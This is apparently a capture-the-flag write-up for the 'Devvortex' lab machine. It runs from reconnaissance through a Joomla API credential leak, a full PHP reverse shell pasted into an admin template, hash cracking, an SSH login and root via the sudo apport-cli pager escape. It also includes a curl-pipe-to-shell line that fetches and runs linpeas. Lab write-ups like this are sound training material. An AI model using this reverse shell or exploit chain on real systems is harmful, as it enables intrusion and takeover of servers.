**MY NOTE**
 #### IP:
	  10.10.11.242
	  10.10.11.242 devvortex.htb
	  10.10.11.242 dev.devvortex.htb
 #### creds:
	 Lewis:P4ntherg0t1n5r3c0n##
	 logan:tequieromucho

### nmap 
```
### nmap:
```bash
nmap -T4 -sV --version-intensity 9 $IP -p-
nmap -A -T4 -p- -oN nmap.txt 10.10.11.242 
```
Result:
```bash
nmap -A -T4 -p- -oN nmap.txt 10.10.11.242  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-25 14:57 EST
Nmap scan report for devvortex.htb (10.10.11.242)
Host is up (0.039s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DevVortex
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.85 seconds

```
### nikto:
```bash
nikto -url http://devvortex.htb 
```
Result:
```bash  
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.11.242
+ Target Hostname:    devvortex.htb
+ Target Port:        80
+ Start Time:         2023-11-25 14:58:29 (GMT-5)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ nginx/1.18.0 appears to be outdated (current is at least 1.20.1).
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 7962 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2023-11-25 15:02:04 (GMT-5) (215 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
### ffuf
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://devvortex.htb -H "Host: FUZZ.devvortex.htb" -fs 154 
```
Result:
```

        /___\  /___\           /___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://devvortex.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.devvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 74ms]
:: Progress: [100000/100000] :: Job [1/1] :: 1526 req/sec :: Duration: [0:01:13] :: Errors: 0 ::

```
### dirb
```bash
dirb http://dev.devvortex.htb/
```

From this site https://vulncheck.com/blog/joomla-for-rce
### Curl 
```bash
curl -v http://dev.devvortex.htb/api/index.php/v1/config/application?public=true   
```
Result:  **({"user":"lewis","id":224}},{"type":"application","id":"224","attributes":{"password":"P4ntherg0t1n5r3c0n##","id":224}},)**
```bash
*   Trying 10.10.11.242:80...
* Connected to dev.devvortex.htb (10.10.11.242) port 80
> GET /api/index.php/v1/config/application?public=true HTTP/1.1
> Host: dev.devvortex.htb
> User-Agent: curl/8.4.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Sat, 25 Nov 2023 21:52:10 GMT
< Content-Type: application/vnd.api+json; charset=utf-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< x-frame-options: SAMEORIGIN
< referrer-policy: strict-origin-when-cross-origin
< cross-origin-opener-policy: same-origin
< X-Powered-By: JoomlaAPI/1.0
< Expires: Wed, 17 Aug 2005 00:00:00 GMT
< Last-Modified: Sat, 25 Nov 2023 21:52:10 GMT
< Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
< Pragma: no-cache
< 
{"links":{"self":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true","next":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20","last":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"},"data":[{"type":"application","id":"224","attributes":{"offline":false,"id":224}},{"type":"application","id":"224","attributes":{"offline_message":"This site is down for maintenance.<br>Please check back again soon.","id":224}},{"type":"application","id":"224","attributes":{"display_offline_message":1,"id":224}},{"type":"application","id":"224","attributes":{"offline_image":"","id":224}},{"type":"application","id":"224","attributes":{"sitename":"Development","id":224}},{"type":"application","id":"224","attributes":{"editor":"tinymce","id":224}},{"type":"application","id":"224","attributes":{"captcha":"0","id":224}},{"type":"application","id":"224","attributes"* Connection #0 to host dev.devvortex.htb left intact
:{"list_limit":20,"id":224}},{"type":"application","id":"224","attributes":{"access":1,"id":224}},{"type":"application","id":"224","attributes":{"debug":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang_const":true,"id":224}},{"type":"application","id":"224","attributes":{"dbtype":"mysqli","id":224}},{"type":"application","id":"224","attributes":{"host":"localhost","id":224}},{"type":"application","id":"224","attributes":{"user":"lewis","id":224}},{"type":"application","id":"224","attributes":{"password":"P4ntherg0t1n5r3c0n##","id":224}},{"type":"application","id":"224","attributes":{"db":"joomla","id":224}},{"type":"application","id":"224","attributes":{"dbprefix":"sd4fg_","id":224}},{"type":"application","id":"224","attributes":{"dbencryption":0,"id":224}},{"type":"application","id":"224","attributes":{"dbsslverifyservercert":false,"id":224}}],"meta":{"total-pages":4}} 
```

log on http://dev.devvortex.htb/administrator/index.php with the creds
users: lewis:P4ntherg0t1n5r3c0n##


...
It WORK!

Now!
into the /administrator/templates/atum/error.php" we paste the a PHP reverse shell (from revshell.com) 
```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.6';
$port = 1234;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```
And save it.

we start netcat and call our shell from a web page 
(http://dev.devvortex.htb/administrator/templates/atum/error.php)
 ...
 It WORK!
```bash
nc -lnvp 1234                                                            

listening on [any] 1234 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.11.242] 55306
Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 22:19:38 up  3:19,  0 users,  load average: 0.06, 0.44, 0.68
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ env
USER=www-data
HOME=/var/www
PWD=/

```

Let's upgrade the shell with python3
```bash 
python3 -c 'import pty;pty.spawn ("/bin/bash")'
```




```

649 | lewis | lewis | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u | 0 | 1 | 2023-09-25 16:44:24 | 2023-11-25 19:35:07

logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 tequieromucho
mysql> select * from sd4fg_users; 
```


```
```bash
hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt
```
Result:
```bash
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy...tkIj12
Time.Started.....: Sun Nov 26 12:58:35 2023 (18 secs)
Time.Estimated...: Sun Nov 26 12:58:53 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       76 H/s (6.23ms) @ Accel:4 Loops:32 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1408/14344385 (0.01%)
Rejected.........: 0/1408 (0.00%)
Restore.Point....: 1392/14344385 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:992-1024
Candidate.Engine.: Device Generator
Candidates.#1....: moises -> tagged
Hardware.Mon.#1..: Util: 91%

Started: Sun Nov 26 12:58:03 2023
Stopped: Sun Nov 26 12:58:54 2023
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=bcrypt
```
Result:
```bash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tequieromucho    (?)     
1g 0:00:00:07 DONE (2023-11-26 12:56) 0.1322g/s 185.7p/s 185.7c/s 185.7C/s lacoste..harry
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

try ssh to logan ...
```bash
ssh logan@10.10.11.242
tequieromucho
```
Result:
```bash
The authenticity of host '10.10.11.242 (10.10.11.242)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.242' (ED25519) to the list of known hosts.
logan@10.10.11.242's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

ls
user.txt

cat user.txt
b0f5af11ba54d87f82923e36cac6eaa5

env
SHELL=/bin/bash
PWD=/home/logan
LOGNAME=logan
XDG_SESSION_TYPE=tty
MOTD_SHOWN=pam
HOME=/home/logan
LANG=en_US.UTF-8
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=10.10.14.6 53680 10.10.11.242 22
LESSCLOSE=/usr/bin/lesspipe %s %s
XDG_SESSION_CLASS=user
TERM=xterm-256color
LESSOPEN=| /usr/bin/lesspipe %s
USER=logan
SHLVL=1
XDG_SESSION_ID=359
XDG_RUNTIME_DIR=/run/user/1000
SSH_CLIENT=10.10.14.6 53680 22
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
SSH_TTY=/dev/pts/3
_=/usr/bin/env

sudo -l
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli

```
NOW! we got something! 
**"User logan may run the following commands on devvortex:
(ALL : ALL) /usr/bin/apport-cli"**

so let's find exploit for
```bash 
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```

```bash
python3 -m http.server 
```

```bash
curl 10.10.10.10/linpeas.sh | sh
```
Result:
```bash
User logan may run the following commands on devvortex:
  (ALL : ALL) /usr/bin/apport-cli

══════════╣ Analyzing SSH Files (limit 70)





-rw-r--r-- 1 root root 601 May  7  2020 /etc/ssh/ssh_host_dsa_key.pub
-rw-r--r-- 1 root root 173 May  7  2020 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 93 May  7  2020 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 565 May  7  2020 /etc/ssh/ssh_host_rsa_key.pub

PermitRootLogin yes
ChallengeResponseAuthentication no
UsePAM yes
PasswordAuthentication yes

══╣ Possible private SSH keys were found!
/var/www/dev.devvortex.htb/libraries/vendor/phpseclib/phpseclib/phpseclib/Crypt/EC/Formats/Keys/PKCS8.php
/var/www/dev.devvortex.htb/libraries/vendor/phpseclib/phpseclib/phpseclib/Crypt/EC/Formats/Keys/PKCS1.php
/var/www/dev.devvortex.htb/libraries/vendor/phpseclib/phpseclib/phpseclib/Crypt/DH/Formats/Keys/PKCS8.php
/var/www/dev.devvortex.htb/libraries/vendor/phpseclib/phpseclib/phpseclib/Crypt/Common/Formats/Keys/PKCS8.php
/var/www/dev.devvortex.htb/libraries/vendor/phpseclib/phpseclib/phpseclib/Crypt/Common/Formats/Keys/PKCS1.php
/var/www/dev.devvortex.htb/libraries/vendor/phpseclib/phpseclib/phpseclib/Crypt/Common/Formats/Keys/OpenSSH.php
/var/www/dev.devvortex.htb/libraries/vendor/phpseclib/phpseclib/phpseclib/Crypt/DSA/Formats/Keys/PKCS8.php
/var/www/dev.devvortex.htb/libraries/vendor/phpseclib/phpseclib/phpseclib/Crypt/DSA/Formats/Keys/PKCS1.php
/var/www/dev.devvortex.htb/libraries/vendor/phpseclib/phpseclib/phpseclib/Crypt/RSA/Formats/Keys/PKCS8.php
/var/www/dev.devvortex.htb/libraries/vendor/phpseclib/phpseclib/phpseclib/Crypt/RSA/Formats/Keys/PKCS1.php
/var/www/dev.devvortex.htb/libraries/vendor/phpseclib/phpseclib/phpseclib/Crypt/RSA/Formats/Keys/PSS.php
/var/www/dev.devvortex.htb/libraries/vendor/web-token/jwt-core/Util/ECKey.php


╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd


╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwxr-sr-x 1 root shadow 43K Feb  2  2023 /usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 43K Feb  2  2023 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root utmp 15K Sep 30  2019 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root tty 35K May 30 15:42 /usr/bin/wall
-rwxr-sr-x 1 root ssh 343K Aug  4 22:02 /usr/bin/ssh-agent
-rwxr-sr-x 1 root mail 15K Aug 26  2019 /usr/bin/mlock
-rwxr-sr-x 1 root shadow 31K Nov 29  2022 /usr/bin/expiry
-rwxr-sr-x 1 root tty 15K Mar 30  2020 /usr/bin/bsd-write
-rwxr-sr-x 1 root shadow 83K Nov 29  2022 /usr/bin/chage
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root crontab 43K Feb 13  2020 /usr/bin/crontab







```



```bash
killall -SEGV sleep
 sleep: no process found

killall -SIGSEGV sleep
 sleep: no process found
 
sleep 13 & killall -SIGSEGV sleep
[1] 71020

ls /var/crash
_dev_shm_exploit_decoy.1000.crash  _usr_bin_sleep.1000.crash  _usr_bin_sleep.1000.upload
[1]+  Segmentation fault      (core dumped) sleep 13

sudo apport-cli -c /var/crash/_usr_bin_sleep.1000.crash

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (30.1 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V

*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.
..............................................................................................................................
..............................................................................................................................................

/bin/bash: -c: line 0: `done'
!done  (press RETURN)
/bin/bash: q: command not found
!done  (press RETURN)
./root/root.txt
!done  (press RETURN)
./root/root.txt
!done  (press RETURN)
e2a4cdd5a44cb29db5b929355031059d
```

